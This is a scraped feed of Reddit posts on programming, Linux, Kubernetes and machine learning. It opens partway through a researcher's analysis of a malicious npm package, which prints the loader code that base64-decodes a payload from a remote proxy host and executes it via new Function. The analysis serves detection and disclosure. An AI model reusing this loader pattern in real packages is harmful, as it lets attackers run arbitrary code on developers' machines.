href=\"https://proxy.eslint-proxy.site\"><code>https://proxy.eslint-proxy.site</code></a> can return a JSON message such as <code>{&quot;error&quot;: &quot;&lt;JS Payload&gt;&quot;}</code> which in turn will be passed to <code>errorHandler</code> as an <code>Error</code> object.</p> <p>The error handler in turn does the following:</p> <ul> <li>Decode the message as base64 string</li> </ul> <p>&#8203;</p> <pre><code>const decoded = Buffer.from(error, &quot;base64&quot;).toString(&quot;utf-8&quot;); </code></pre> <ul> <li><p>Constructs a function from the decoded string</p> <p>const handler = new Function.constructor(&quot;require&quot;, errCode);</p></li> <li><p>Finally executes the remote code</p></li> </ul> <p>&#8203;</p> <pre><code> const handlerFunc = createHandler(decoded); if (handlerFunc) { handlerFunc(require); } else { console.error(&quot;Handler function is not available.&quot;); } </code></pre> <p>p.s: I am the author and maintainer of <a href=\"https://github.com/safedep/vet\">https://github.com/safedep/vet</a> and we work to continuously detect and report malicious packages.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Ok_Possibility1445\"> /u/Ok_Possibility1445 </a> <br/> <span><a href=\"https://safedep.io/digging-into-dynamic-malware-analysis-signals/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lkz2oa/malicious_npm_eslintconfigairbnbcompat_package/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"New to Go and looking for what to learn next and project ideas","url":"https://www.reddit.com/r/golang/comments/1lkyjm9/new_to_go_and_looking_for_what_to_learn_next_and/","date":1750939924,"author":"/u/Big-Sound-7760","guid":172151,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I recently started learning Golang. I have covered the basics and created a few things: </p> <p>REST APIs with net/http and gorilla/mux Simple websockets A basic TCP server MongoDB integration Authentication using JWT</p> <p>At this point I&#39;m not sure what to do next can u please guide me What can I learn next. Additionally, I would love to hear your ideas for projects that could help me practice what I&#39;ve learned, preferably something that&#39;s challenging but attainable for someone still learning.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Big-Sound-7760\"> /u/Big-Sound-7760 </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lkyjm9/new_to_go_and_looking_for_what_to_learn_next_and/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lkyjm9/new_to_go_and_looking_for_what_to_learn_next_and/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Rust 1.88: 'If-Let Chain' syntax stabilized","url":"https://www.reddit.com/r/rust/comments/1lky9d2/rust_188_iflet_chain_syntax_stabilized/","date":1750939066,"author":"/u/thurn2","guid":172149,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>New valid syntax: </p> <p><code> if let Some((fn_name, after_name)) = s.split_once(&quot;(&quot;) &amp;&amp; !fn_name.is_empty() &amp;&amp; is_legal_ident(fn_name) &amp;&amp; let Some((args_str, &quot;&quot;)) = after_name.rsplit_once(&quot;)&quot;) { </code></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/thurn2\"> /u/thurn2 </a> <br/> <span><a href=\"https://releases.rs/docs/1.88.0/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1lky9d2/rust_188_iflet_chain_syntax_stabilized/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Command Pattern as an API Architecture Style","url":"https://www.reddit.com/r/golang/comments/1lky2ps/command_pattern_as_an_api_architecture_style/","date":1750938487,"author":"/u/ymz-ncnk","guid":172109,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/golang/comments/1lky2ps/command_pattern_as_an_api_architecture_style/\"> <img src=\"https://external-preview.redd.it/vxgv5l3fztmX-SD7GLoOE9EgImqdfhLcE2miI9c3Y60.jpeg?width=640&amp;crop=smart&amp;auto=webp&amp;s=e0f00027a67a3b8f85a4fd02fddb4f75c8f61e55\" alt=\"Command Pattern as an API Architecture Style\" title=\"Command Pattern as an API Architecture Style\" /> </a> </td><td> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/ymz-ncnk\"> /u/ymz-ncnk </a> <br/> <span><a href=\"https://ymz-ncnk.medium.com/command-pattern-as-an-api-architecture-style-be9ac25d6d94\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lky2ps/command_pattern_as_an_api_architecture_style/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"\"Why is the Rust compiler so slow?\"","url":"https://www.reddit.com/r/rust/comments/1lkxad3/why_is_the_rust_compiler_so_slow/","date":1750935847,"author":"/u/jahmez","guid":172232,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/jahmez\"> /u/jahmez </a> <br/> <span><a href=\"https://sharnoff.io/blog/why-rust-compiler-slow\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1lkxad3/why_is_the_rust_compiler_so_slow/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Programming as Theory Building: Why Senior Developers Are More Valuable Than Ever","url":"https://www.reddit.com/r/programming/comments/1lkx4ts/programming_as_theory_building_why_senior/","date":1750935342,"author":"/u/cekrem","guid":172108,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/cekrem\"> /u/cekrem </a> <br/> <span><a href=\"https://cekrem.github.io/posts/programming-as-theory-building-naur/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lkx4ts/programming_as_theory_building_why_senior/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Blender 5.0 Introducing HDR Support On Linux With Vulkan + Wayland","url":"https://www.reddit.com/r/linux/comments/1lkx1kn/blender_50_introducing_hdr_support_on_linux_with/","date":1750935019,"author":"/u/B3_Kind_R3wind_","guid":172111,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/B3_Kind_R3wind_\"> /u/B3_Kind_R3wind_ </a> <br/> <span><a href=\"https://www.phoronix.com/news/Blender-5.0-HDR-Linux-Wayland\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lkx1kn/blender_50_introducing_hdr_support_on_linux_with/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Weekly: This Week I Learned (TWIL?) thread","url":"https://www.reddit.com/r/kubernetes/comments/1lkw82j/weekly_this_week_i_learned_twil_thread/","date":1750932058,"author":"/u/gctaylor","guid":172147,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Did you learn something new this week? Share here!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/gctaylor\"> /u/gctaylor </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lkw82j/weekly_this_week_i_learned_twil_thread/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lkw82j/weekly_this_week_i_learned_twil_thread/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"My Journey from Java to Go: Why I Think Go's Packages Are Actually Better","url":"https://www.reddit.com/r/golang/comments/1lkvjpi/my_journey_from_java_to_go_why_i_think_gos/","date":1750929424,"author":"/u/hosmanagic","guid":172017,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>When I was going through <em>The Go Programming Language</em> (Kernighan et al.), I thought I’d just skim the chapter on packages. In Java, at least, it&#39;s a relatively unremarkable topic—something you don’t spend much time thinking about.</p> <p>But Go is different. Interestingly, Go packages made me think more deeply about code organization than Java packages ever did.</p> <p>The more I reflected on Go packages—especially while writing this article—the more they made sense. And to be honest, I think Java should reconsider some of its package conventions, as they might be one of the reasons for its &quot;notorious&quot; verbosity.</p> <p><a href=\"https://meroxa.com/blog/from-java-to-go-part-2-packages/\">https://meroxa.com/blog/from-java-to-go-part-2-packages/</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/hosmanagic\"> /u/hosmanagic </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lkvjpi/my_journey_from_java_to_go_why_i_think_gos/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lkvjpi/my_journey_from_java_to_go_why_i_think_gos/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"You Don’t Own the Word “Freedom”: A Full-Burn Response to the GNU/Linux Comment That Tried to Gatekeep Me Off My Own Machine","url":"https://www.reddit.com/r/linux/comments/1lkv19k/you_dont_own_the_word_freedom_a_fullburn_response/","date":1750927418,"author":"/u/fireborn1472","guid":172018,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I saw some of my posts made it to rreddit, so I figured I&#39;d post the latest myself.</p> <p>I have no idea where this comment originated, and I&#39;m sure I know how this will be received here.</p> <p>However, I think what I said here needed to be said.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/fireborn1472\"> /u/fireborn1472 </a> <br/> <span><a href=\"https://fireborn.mataroa.blog/blog/you-dont-own-the-word-freedom-a-full-burn-response-to-the-gnulinux-comment-that-tried-to-gatekeep-me-off-my-own-machine/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lkv19k/you_dont_own_the_word_freedom_a_fullburn_response/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Your Doctor's AI Isn't Biased—His Prompts Are.","url":"https://www.reddit.com/r/artificial/comments/1lkukia/your_doctors_ai_isnt_biasedhis_prompts_are/","date":1750925494,"author":"/u/LukeNarwhal","guid":172305,"unread":true,"content":"<p>April 2025 peer-reviewed study shows even tiny prompt tweaks sway AI bias.</p><p>Tests show every prompt has built-in bias, worsened by order, labels, framing, and even asking “why.”</p><p>Newer models, GPT-4 included, output even stronger biases than GPT-3, and researchers conclude a truly neutral prompt and full objectivity is impossible. <em>\"there will never be such a thing as a neutral or perfect prompt,\"</em></p><p>Prompt engineering cannot fix bias. Only mass-averaging prompt variations can, and is impractical for daily use. Meanwhile, doctors, lawyers, and editors may unknowingly anchor high-stakes decisions on these skewed outputs.</p><p>Beneath the surface, large language models crunch billions of numbers in tangled math no one can trace, so every answer is an educated guess, not a sure fact.</p><p>When doctors and lawyers depend on AI, will your fate rest on hidden AI bias?</p><p>Now journals vet papers with AI, will peer-review become contaminated?</p><p>Can science forge the intuition to craft AI beyond language models?</p><p>-Doctor prompts your symptoms. </p><p>-Unless LLM running factorial variation of said prompt to massive degree = bias in response. </p><p>LLM biases more to Runny nose having importance for Doctor A. Cough for Doctor B. Even if Doctor did not clarify that. </p><p>This is one of innumerous biases. Study covers multiple and suggests it is impossible to fix this in one prompt. Furthermore, evidence that attempts to prompt engineer/outsmart LLM may paradoxically cause more biased responses.</p><p><strong>Responding to non-thinkers in advance:</strong></p><p>Besides the point. This is about training data, inherent to LLMs. </p><p>“<em>Surely the medical LLMs know about this and would be employing the factorial methods in said peer-reviewed study.</em>”</p><p>Nope. Hitherto not covered in media at all.</p><p>Wrong, read the peer-reviewed study. Your hot take 3-second impulse anecdote is irrelevant.</p><p>This is a training data inference issue. Not improving in new LLMs. Lives at stake. Worth the 5 minute read while you take your shit.</p>","contentLength":1954,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is there a way to print a list of vulnerabilities?","url":"https://www.reddit.com/r/linux/comments/1lkukby/is_there_a_way_to_print_a_list_of_vulnerabilities/","date":1750925475,"author":"/u/No-Alternative-2881","guid":171967,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I am looking to prove there is no sweet32 vuln on my sever. I was screen sharing with another tech recently - I didn’t see his commands, but he ran something and it output a list, he scrolled down and found sweet32, he then upgraded the node, ran the same code, scrolled down and it was no longer showing. </p> <p>Any idea what this command could be?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/No-Alternative-2881\"> /u/No-Alternative-2881 </a> <br/> <span><a href=\"https://www.reddit.com/r/linux/comments/1lkukby/is_there_a_way_to_print_a_list_of_vulnerabilities/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lkukby/is_there_a_way_to_print_a_list_of_vulnerabilities/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Run web compatible Half-Life or Counter Strike 1.6 dedicated server using xash3d-fwgs and go pion","url":"https://www.reddit.com/r/golang/comments/1lktz9l/run_web_compatible_halflife_or_counter_strike_16/","date":1750923128,"author":"/u/yohimik","guid":171966,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hey there<br/> Recently I made a cgo wrapper for xash3d-fwgs engine which runs hl and cs<br/> Furthermore, I added a webrtc example to demonstrate how to connect to the server from the web<br/> why go?<br/> go has backend session based engines like nakama, so it&#39;s easy to run something like cs2 using just cs1.6 and go, but don&#39;t do just cs or hl, there are many free mods you can use<br/> <a href=\"https://github.com/yohimik/goxash3d-fwgs\">https://github.com/yohimik/goxash3d-fwgs</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/yohimik\"> /u/yohimik </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lktz9l/run_web_compatible_halflife_or_counter_strike_16/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lktz9l/run_web_compatible_halflife_or_counter_strike_16/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The importance of kindness in engineering","url":"https://www.reddit.com/r/programming/comments/1lktp8d/the_importance_of_kindness_in_engineering/","date":1750922027,"author":"/u/AlexandraLinnea","guid":172016,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Remember when you just started out and a senior sat with you and explained some basic concepts behind their code without judgement and patience?</p> <p>Remember when you saw a colleague working on a gnarly problem and you stepped in to pair with them or vice versa?</p> <p>Remember when you were extremely tired and someone chased you for an update on a piece of work that was not a priority. Instead of snapping at them you took a breath and explained why you could not look into it right now but would circle back to them in a week or so?</p> <p>Kindness is not only about reactive patience and being helpful but also influences the way we work.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/AlexandraLinnea\"> /u/AlexandraLinnea </a> <br/> <span><a href=\"https://ashouri.xyz/post/kindnessinengineering\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lktp8d/the_importance_of_kindness_in_engineering/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Did you get Neurips reviews assignments?","url":"https://www.reddit.com/r/MachineLearning/comments/1lktj7p/d_did_you_get_neurips_reviews_assignments/","date":1750921373,"author":"/u/Celmeno","guid":172233,"unread":true,"content":"<div><p>I just realized that I never got any papers assigned which I found a bit odd given the extreme number of submissions. Did they forget about me? </p></div>   submitted by   <a href=\"https://www.reddit.com/user/Celmeno\"> /u/Celmeno </a>","contentLength":174,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Looking for an Open Source Kubernetes Replication Tool for Periodic Cluster Sync (Disaster Recovery Use Case)","url":"https://www.reddit.com/r/kubernetes/comments/1lktgyy/looking_for_an_open_source_kubernetes_replication/","date":1750921143,"author":"/u/Tulpar007","guid":172107,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I have 2 Kubernetes clusters: one is production, the other is a standby. I want to periodically replicate all data (pods, PVCs, configs, etc.) from the prod cluster to the standby cluster.</p> <p>Goal: if prod goes down, the standby can quickly take over with minimal data loss.</p> <p>Looking for an open source tool that supports:</p> <ul> <li>Scheduled sync</li> <li>Multi-cluster support</li> <li>PVC + resource replication</li> </ul> <p>So far I’ve seen: Velero, VolSync, TrilioVault CE, Stash — any recommendations or real-world experiences?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Tulpar007\"> /u/Tulpar007 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lktgyy/looking_for_an_open_source_kubernetes_replication/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lktgyy/looking_for_an_open_source_kubernetes_replication/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How much code does that proc macro generate?","url":"https://www.reddit.com/r/rust/comments/1lks869/how_much_code_does_that_proc_macro_generate/","date":1750916451,"author":"/u/nnethercote","guid":172357,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/nnethercote\"> /u/nnethercote </a> <br/> <span><a href=\"https://nnethercote.github.io/2025/06/26/how-much-code-does-that-proc-macro-generate.html\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1lks869/how_much_code_does_that_proc_macro_generate/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Suggestions on dealing with rejections","url":"https://www.reddit.com/r/MachineLearning/comments/1lkq2zw/d_suggestions_on_dealing_with_rejections/","date":1750909173,"author":"/u/Successful-Bee4017","guid":172394,"unread":true,"content":"<p>Lately I wrote a paper on video restorations, and in fact the method did extremely well on all SOTA methods and over 6 different tasks</p><p>But for some reason the reviewers claiming its incremental or same as previous</p><p>This paper I wrote in last year submitted directly a draft to Wacv round 2 and got 4 3 2</p><p>Then all of sudden ICCV 2 3 2 2</p><p>Now I am just feeling dumb about my work. Not sure if I should just leave as it is in Arxiv or do further submissions.</p><p>Honestly any suggestions guys in this situation.</p>","contentLength":497,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How Do You Handle Orphaned Processes?","url":"https://www.reddit.com/r/golang/comments/1lknghk/how_do_you_handle_orphaned_processes/","date":1750901224,"author":"/u/Hamguy1234","guid":172360,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>For a little bit of context, I&#39;m currently writing a library to assist in the creation of a chess GUI. This library implements the UCI chess protocol, and as part of that it will be necessary to run a variety of uci compatible chess engines.</p> <p>The straightforward approach is to use <code>exec.Command()</code>, and then if the engine begins to misbehave call <code>Process.Kill()</code>. The obvious issue with this is that child processes are not killed and in the case of a chess engine these child processes could run for a very long time while taking a lot of cpu. To me it seems like it comes down to two options, but if Go has something more graceful than either of these I would love to know.</p> <ul> <li>Ignore child processes and hope they terminate promptly, (this seems to put too much faith in the assumption that other programmers will prevent orphaned processes from running for too long.)</li> <li>Create OS dependent code for killing a program (such as posix process groups).</li> </ul> <p>The second option seems to be the most correct, but it is more work on my side, and it forces me to say my library is only supported on certain platforms. </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Hamguy1234\"> /u/Hamguy1234 </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lknghk/how_do_you_handle_orphaned_processes/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lknghk/how_do_you_handle_orphaned_processes/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How do you see the current state and future of Rust? And, will Rust get popular in game dev?","url":"https://www.reddit.com/r/rust/comments/1lkmloc/how_do_you_see_the_current_state_and_future_of/","date":1750898741,"author":"/u/lettsten","guid":171925,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hi!</p> <p>I&#39;m a hobbyist who&#39;ve been eyeing Rust for a while, dabbled a bit. As a hobbyist I don&#39;t have my finger on the industrial pulse and would like to hear your thoughts and insights about the current state of Rust in general&mdash;things that are hard for me to look up on a wiki page and that requires the insights of those of you who work with it regularly or semi-regularly.</p> <p><strong>What do you think about the current state of Rust as a language, ecosystem and community?</strong></p> <p>I&#39;ve seen some flak about async in Rust. Do you agree with it? How happy are you about the current state of the language? Is Rust your favourite language? What are your biggest gripes with the language, and do you think they will be resolved within the next 2-5 years?</p> <p>From what I understand, Rust jobs are rare. Is your impression that they are becoming more common? Do you think Rust will become more prevalent than C or C++ at some point?</p> <p>Are you happy with the Rust ecosystem, tooling, library availability and so on? Which areas shine, and which are most lacking? What are your opinions on the Rust community, in terms of demographics, friendliness, activity, open-source work and so on?</p> <p>My impression is that Rust is most suited to systems level programming, especially critical components where correctness is essential. Do you see Rust taking over other segments or domains?</p> <p>Reason I ask these questions is honestly because I would love to get psyched about Rust again, and because I would like an honest and well-informed impression of the current state of the language.</p> <p>Any and all insights are very welcome!</p> <p>Edit: <strong><em>I&#39;m mostly interesting in the state of Rust as a whole</em></strong>, the gamedev question from the subject is secondary.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/lettsten\"> /u/lettsten </a> <br/> <span><a href=\"https://www.reddit.com/r/rust/comments/1lkmloc/how_do_you_see_the_current_state_and_future_of/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/rust/comments/1lkmloc/how_do_you_see_the_current_state_and_future_of/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Alarming amount of schizoid people being validated by LLMs, anyone else experienced this?","url":"https://www.reddit.com/r/MachineLearning/comments/1lkmkuw/d_alarming_amount_of_schizoid_people_being/","date":1750898678,"author":"/u/GodIsAWomaniser","guid":171812,"unread":true,"content":"<p>I've had more experiences in the last couple of weeks encountering people with very strong schizoid traits than I have in the last few years around artificial intelligence machine learning etc, but really around the use of large language models. </p><p>I've met five different people online in the last 3 weeks who have messaged me on discord or read it asking for help with a project, only to be immediately sent a three paragraph chat bot summary and 400 lines of pseudo python. When I ask for them to explain their project they become defensive and tell me that the LLM understands the project so I just need to read over the code \"as an experienced Dev\" (I only have foundational knowledge, 0 industry experience).</p><p>Or other times where I've had people message me about a fantastic proof or realisation that have had that is going to revolutionise scientific understanding, and when I ask about it they send walls of LLM generated text with no ability to explain what it's about, but they are completely convinced that the LLM had somehow implemented their idea in a higher order logic solver or through code or through a supposedly highly sophisticated document.</p><p>People like this have always been around, but the sycophantic nature of a transformer chatbot (if it wasn't sycophantic it would be even more decoherent over time due to its feed forward nature) has created a personal echo chamber where an entity that is being presented as having agency, authority, knowledge and even wisdom is telling them that every idea they have no matter how pathological or malformed is a really good one, and not only that but is easily implemented or proven in a way that is accepted by wider communities. </p><p>After obviously spending weeks conversing with these chatbots these people (who I am not calling schizophrenic but are certainly of a schizoid personality type) feel like they have built up a strong case for their ideas, substituting even the most simple domain knowledge for an LLMs web searching and rag capability (which is often questionable, if not retrieving poison) and then find themselves ready to bring proof of  to the wider world or even research communities. </p><p>When people who have schizoid personality traits are met with criticism for their ideas, and especially for specific details, direct proof, and how their ideas relate to existing cannon apart from the nebulous notion that the conclusions are groundbreaking, they respond with anger, which is normal and has been well documented for a long time.</p><p>What's changed though Just in the last year or two is that these types of people have a digital entity that will tell them that their ideas are true, when they go out into the world and their unable to explain any of it to a real human, they come back to the LLM to seek support which then inevitably tells them that it's the world that's wrong and they're actually really special and no one else can understand them. </p><p>This seems like a crisis waiting to happen for a small subsection of society globally, I assume that multilingual LLM's behave fairly similarly in different languages because of similar rules for the data set and system prompts to English speaking data and prompts. </p><p>I know that people are doing research into how LLM use affects people in general, but I feel that There is a subset of individuals for whom the use of LLM chatbots represents a genuine, immediate and essentially inevitable danger that at best can supercharge the social isolation and delusions, and at worst lead to immediately self-destructive behaviour. </p><p> anyway maybe this is all just me venting my frustration from meeting a few strange people online, but I feel like there is a strong Avenue for research into how people with schizoid type mental health issues (be it psychosis, schizophrenia, OCD, etc.) using LLM chatbots can rapidly lead to negative outcomes for their condition.</p><p>And again I don't think there's a way of solving this with transformer architecture, because if the context window is saturated with encouragement and corrections it would just lead to incoherent responses and poor performance, the nature of feedback activations lends itself much better to a cohesive personality and project. </p><p>I can't think of any solution, even completely rewriting the context window between generations that would both be effective in the moment and not potentially limit future research by being too sensitive to ideas that haven't been implemented before.</p><p>Please pardon the very long post and inconsistent spelling or spelling mistakes, I've voice dictated it all because I've broken my wrist.</p>","contentLength":4590,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"DockedUp: A Terminal Dashboard for Docker Containers, Built in Python","url":"https://www.reddit.com/r/programming/comments/1lkmja0/dockedup_a_terminal_dashboard_for_docker/","date":1750898553,"author":"/u/Fragrant_Letter8595","guid":172150,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hello <a href=\"/r/programming\">r/programming</a>!</p> <p>I’ve been working on <strong>DockedUp</strong>, a CLI tool that makes monitoring Docker containers easier and more intuitive. If you’re tired of juggling <code>docker ps</code>, <code>docker stats</code>, and switching terminals to check logs or restart containers, this might be for you!</p> <h2>What My Project Does</h2> <p>DockedUp is a real-time, interactive dashboard that displays your Docker containers’ status, health, CPU, and memory usage in a clean, color-coded terminal view. It automatically groups containers by docker-compose projects and uses emojis to make status (Up 🟢, Down 🔴) and health (Healthy ✅, Unhealthy ⚠️) instantly clear. Navigate containers with arrow keys and use hotkeys to: - <code>l</code>: View live logs - <code>r</code>: Restart a container - <code>x</code>: Stop a container - <code>s</code>: Open a shell inside a container</p> <h2>Target Audience</h2> <p>DockedUp is designed for developers and DevOps engineers who work with Docker containers and want a quick, unified view of their environment without leaving the terminal. It’s ideal for those managing docker-compose stacks in development or small-scale production setups. Whether you’re a Python enthusiast, a CLI lover, or a DevOps pro looking to streamline workflows, DockedUp is built to save you time and hassle.</p> <h2>Comparison</h2> <p>Unlike <code>docker ps</code> and <code>docker stats</code>, which require multiple commands and terminal switching, DockedUp offers a single, live-updating dashboard with interactive controls. Compared to tools like Portainer (web-based) or lazydocker (another CLI), DockedUp is lightweight, focuses on docker-compose project grouping, and integrates emoji-based visual cues for quick status checks. It’s Python-based, easy to install via PyPI, and doesn’t need a web server, making it a great fit for terminal-centric workflows.</p> <h2>Try It Out</h2> <p>It’s on PyPI and takes one command to install (I recommend <code>pipx</code> for CLI tools): <code>bash pipx install dockedup </code> Or: <code>bash pip install dockedup </code> Then run <code>dockedup</code> to start the monitor. Check out the <a href=\"https://github.com/anilrajrimal1/dockedup\">GitHub repo</a> for more details and setup instructions. If you like the project, I’d really appreciate a ⭐ on GitHub to help spread the word!</p> <h2>Feedback Wanted!</h2> <p>I’d love to hear your thoughts—any features you’d like to see or issues you run into? Contributions are welcome (it’s MIT-licensed). </p> <p>What’s your go-to way to monitor Docker containers?</p> <p>Thanks for checking it out! 🚀</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Fragrant_Letter8595\"> /u/Fragrant_Letter8595 </a> <br/> <span><a href=\"https://github.com/anilrajrimal1/dockedup\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1lkmja0/dockedup_a_terminal_dashboard_for_docker/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"ArgoCD deploying sensitive non-Secrets","url":"https://www.reddit.com/r/kubernetes/comments/1lkmgnf/argocd_deploying_sensitive_nonsecrets/","date":1750898341,"author":"/u/nullvar2000","guid":171152,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Happy Wednesday fellow Kubernetes enthusiasts! I have a homelab cluster that I&#39;ve spent quite a bit of time learning and implementing Gitops using ArgoCD. I&#39;m still planning out my secrets management, but I&#39;ve run into a question that&#39;s somewhat related. How do I manage sensitive parameters in non-secrets? I&#39;m talking about things like hostnames, domains, IP addresses, etc. </p> <p>For example, ingresses have my purchased domain included and even though I&#39;m only using internal DNS records for them, I&#39;d rather not have that kind of information public on Github.</p> <p>After some research, it would seem FluxCD has a post build variable substitution capability that could take care of this, but I&#39;d like to find a solution using Kustomize or ArgoCD. Does anybody have another solution to this kind of data? Am I just being too paranoid about this?</p> <p>Thanks</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/nullvar2000\"> /u/nullvar2000 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lkmgnf/argocd_deploying_sensitive_nonsecrets/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lkmgnf/argocd_deploying_sensitive_nonsecrets/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Microsoft Tried To Steal A Project And Almost Got Away With It....","url":"https://www.reddit.com/r/linux/comments/1lkmfs5/microsoft_tried_to_steal_a_project_and_almost_got/","date":1750898271,"author":"/u/Ok-Coyote87","guid":171123,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Ok-Coyote87\"> /u/Ok-Coyote87 </a> <br/> <span><a href=\"https://www.youtube.com/watch?v=TsejK1D4y5k\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lkmfs5/microsoft_tried_to_steal_a_project_and_almost_got/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"lightning-image-viewer 0.2.0","url":"https://www.reddit.com/r/linux/comments/1lkluyb/lightningimageviewer_020/","date":1750896610,"author":"/u/shatsky","guid":171839,"unread":true,"content":"<!-- 